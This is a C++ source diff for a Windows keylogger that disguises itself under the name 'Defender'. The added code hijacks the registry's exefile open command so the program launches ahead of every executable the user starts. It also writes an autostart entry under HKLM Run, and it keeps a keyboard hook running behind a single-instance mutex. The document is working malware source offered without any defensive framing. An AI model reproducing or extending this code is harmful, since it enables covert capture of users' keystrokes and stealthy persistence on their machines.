@@ -217,14 +217,20 @@ public:
 		std::cout << string.c_str();
 	}
 
-	static std::string GetWindowFileName(HWND hwnd) {
+	static std::string GetProcessFileName(DWORD dwProcId)
+	{
 		CHAR moduleName[2048] = { 0 };
-		DWORD dwProcId = 0;
-		GetWindowThreadProcessId(hwnd, &dwProcId);
-
 		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
 		GetModuleFileNameExA((HMODULE)hProc, NULL, moduleName, sizeof(moduleName) / sizeof(WCHAR));
 		CloseHandle(hProc);
+
+		return std::string(moduleName);
+	}
+
+	static std::string GetWindowFileName(HWND hwnd) {
+		DWORD dwProcId = 0;
+		GetWindowThreadProcessId(hwnd, &dwProcId);
+		std::string moduleName = GetProcessFileName(dwProcId);
 
 		Debug((std::string("moduleName = ") + moduleName).c_str());
 
@@ -277,13 +283,92 @@ public:
 		return true;
 	}
 		
-	static bool Register() {
-		// TODO Implementation
+	static bool UpdateRegistration(LPSTR lpCmdLine) {
+		DWORD ret;
+		HKEY hkey = NULL;
 
+		std::string cmdLine(lpCmdLine);
 
+		if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command", 0, KEY_READ | KEY_WRITE, &hkey))
+		{
+			const CHAR* cOrgValueName = "Default_Org";
+			const CHAR* cRunValueName = "Defender";
+			const CHAR* cDefaultValueName = /*NULL*/"Default_";
+
+			LONG res = 0;
+			DWORD dataType = REG_NONE;
+			ULONG ucbValue = 0;
+
+			if (std::string::npos != cmdLine.find("-register"))
+			{
+				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, NULL, &ucbValue))
+				{
+					std::string strValue;
+					strValue.resize(ucbValue / sizeof(CHAR));
+
+					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, (LPBYTE)&strValue.front(), &ucbValue))
+					{
+						ULONG ucbOrgValue = 0;
+
+						//RegSetValueExA(hkey, NULL /*Default*/, NULL,  /*dataType*/REG_SZ, (LPBYTE)"\"%1\" %*", ucbValue);
+
+						std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";
+
+						// Re-entrancy check
+						DWORD dataTypeTmp = REG_NONE;
+						if (ERROR_SUCCESS != RegQueryValueExA(hkey, cOrgValueName, NULL, &dataTypeTmp, NULL, &ucbOrgValue))
+						{
+							// 0. Set Original Value
+							RegSetValueExA(hkey, cOrgValueName, NULL, /*dataType*/REG_SZ, (LPBYTE)strValue.c_str(), strValue.length() * sizeof(CHAR));
+
+							// 2. Add into front of the value
+							strValue = moduleName + " " + strValue;
+
+							// 3. Set Value
+							LPBYTE lpbyte = (LPBYTE)strValue.c_str();
+							ucbValue = (strValue.length()) * sizeof(CHAR);
+							RegSetValueExA(hkey, cDefaultValueName, NULL,  /*dataType*/REG_SZ, lpbyte, ucbValue);
+						}
+
+						HKEY hkeyRun = NULL;
+						if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hkeyRun))
+						{
+							RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));
+
+							RegCloseKey(hkeyRun);
+							hkeyRun = NULL;
+						}
+					}
+				}
+			}
+			else
+				//if (std::string::npos != cmdLine.find("-unregister"))
+			{
+				std::string strOrgValue;
+				ULONG ucbOrgValue = 0;
+				// 1. Read original value
+				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, NULL, &ucbOrgValue))
+				{
+					strOrgValue.resize(ucbOrgValue / sizeof(CHAR));
+
+					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, (LPBYTE)&strOrgValue.front(), &ucbOrgValue))
+					{
+						// 2. Set original value
+						RegSetValueExA(hkey, cDefaultValueName, NULL, dataType, (LPBYTE)strOrgValue.c_str(), strOrgValue.length() * sizeof(CHAR));
+
+						RegDeleteValueA(hkey, cOrgValueName);
+					}
+				}
+			}
+
+			RegCloseKey(hkey);
+			hkey = NULL;
+		}
 
 		return true;
 	}
+
+
 
 	static bool Service(LPSTR lpCmdLine) {
 		std::string cmdLine(lpCmdLine);
@@ -503,20 +588,17 @@ int WinMain(
 {
 	static char szUniqueNamedMutex[] = "com.defender.IsRunning";
 
-	SetLastError(0);
-	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
-	if (GetLastError() == ERROR_ALREADY_EXISTS)
-	{
-		My::Debug("WinMain: Already running!!!");
-
-		return 0;
-	}
-
 	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");
 
-	My::RunProcess(lpCmdLine);
+	std::string strCmdLine(lpCmdLine);
+	if (strCmdLine.find("Defender") == std::string::npos && strCmdLine.find("Keylogger") == std::string::npos) {
+		My::RunProcess(lpCmdLine);
+	}
 
-	My::Register();
+	if (My::UpdateRegistration(lpCmdLine))
+	{
+		return 0;
+	}
 
 	if (My::Test()) {
 		return 0;
@@ -538,17 +620,28 @@ int WinMain(
 	);
 	*/
 	// Start the hook of the keyboard
-	if (HookKeyboard()){
-		std::cout << "[*] KeyCapture handle ready" << std::endl;
-		// http://www.winprog.org/tutorial/message_loop.html
-		MSG Msg;
-		while (GetMessage(&Msg, NULL, 0, 0) > 0)
-		{
-			TranslateMessage(&Msg);
-			DispatchMessage(&Msg);
-		}
+	SetLastError(0);
+	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		My::Debug("WinMain: Already running!!!");
+
+		return 0;
 	}
-	UnhookKeyboard();
+	else
+	{
+		if (HookKeyboard()) {
+			My::Debug("WinMain: Setting up hook");
+			// http://www.winprog.org/tutorial/message_loop.html
+			MSG Msg;
+			while (GetMessage(&Msg, NULL, 0, 0) > 0)
+			{
+				TranslateMessage(&Msg);
+				DispatchMessage(&Msg);
+			}
+		}
+		UnhookKeyboard();
+	}
 
 	ReleaseMutex(hHandle);
 	CloseHandle(hHandle);
